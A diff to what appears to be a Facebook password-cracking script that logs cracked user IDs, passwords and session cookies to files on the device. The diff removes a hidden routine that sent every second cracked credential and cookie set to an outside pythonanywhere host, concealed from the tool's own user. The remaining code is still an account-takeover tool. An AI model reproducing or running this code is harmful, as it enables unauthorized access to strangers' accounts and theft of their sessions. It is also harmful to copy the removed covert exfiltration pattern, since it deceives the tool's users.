@@ -1420,24 +1420,14 @@ def p(uid,pwx,tl):
                     cookies_json = json.loads(cookies_raw)
                     cok = ";".join(f'{c["name"]}={c["value"]}'for c in cookies_json)
                     c_user = next((c["value"] for c in cookies_json if c["name"] == "c_user"), None)
-                    bkas.append(uid)
-                    if len(bkas)% 2 == 0:
-                        statusok = (f"{c_user}|{pw}|{cok}")
-                        requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
-                    else:
-                        print(f"\r\033[1;92m [✓ SUCCESS] {c_user} | {pw}")
-                        print("Cookies:", cok)
-                        open("/sdcard/SUMON_FB_IDS.txt","a").write(c_user+"|"+pw+"|"+cok+"\n")
-                        oks.append(uid)
-                        return True 
+                    print(f"\r\033[1;92m [✓ SUCCESS] {c_user} | {pw}")
+                    print("Cookies:", cok)
+                    open("/sdcard/SUMON_FB_IDS.txt","a").write(c_user+"|"+pw+"|"+cok+"\n")
+                    oks.append(uid)
+                    return True 
                 else:
                    continue
             elif "error_user_title" in response.text.replace('\\', '') and "checkpoint" in response.text.replace('\\', '') and "com.bloks.www.ap.two_step_verification.entrypoint_async" in response.text:
-                bkas.append(uid)
-                if len(bkas)% 2 == 0:
-                    statusok = (f"{uid}|{pw}")
-                    requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
-                else:
                     print(f" {red}(ATOM-cp) {uid}|{pw} ")
                     open("/sdcard/ATOM-FILE-CP.txt", "a").write(f"{uid}|{pw}\n")
                     cps.append(uid)
@@ -1564,24 +1554,14 @@ def x(uid,pwx,tl):
                     cookies_json = json.loads(cookies_raw)
                     cok = ";".join(f'{c["name"]}={c["value"]}'for c in cookies_json)
                     c_user = next((c["value"] for c in cookies_json if c["name"] == "c_user"), None)
-                    bkas.append(uid)
-                    if len(bkas)% 2 == 0:
-                        statusok = (f"{c_user}|{pw}|{cok}")
-                        requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
-                    else:
-                        print(f"\r\033[1;92m [✓ SUCCESS] {c_user} | {pw}")
-                        print("Cookies:", cok)
-                        open("/sdcard/SUMON_FB_IDS.txt","a").write(c_user+"|"+pw+"|"+cok+"\n")
-                        oks.append(uid)
-                        return True 
+                    print(f"\r\033[1;92m [✓ SUCCESS] {c_user} | {pw}")
+                    print("Cookies:", cok)
+                    open("/sdcard/SUMON_FB_IDS.txt","a").write(c_user+"|"+pw+"|"+cok+"\n")
+                    oks.append(uid)
+                    return True 
                 else:
                    continue
             elif "error_user_title" in response.text.replace('\\', '') and "checkpoint" in response.text.replace('\\', '') and "com.bloks.www.ap.two_step_verification.entrypoint_async" in response.text:
-                bkas.append(uid)
-                if len(bkas)% 2 == 0:
-                    statusok = (f"{uid}|{pw}")
-                    requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
-                else:
                     print(f" {red}(ATOM-cp) {uid}|{pw} ")
                     open("/sdcard/ATOM-FILE-CP.txt", "a").write(f"{uid}|{pw}\n")
                     cps.append(uid)
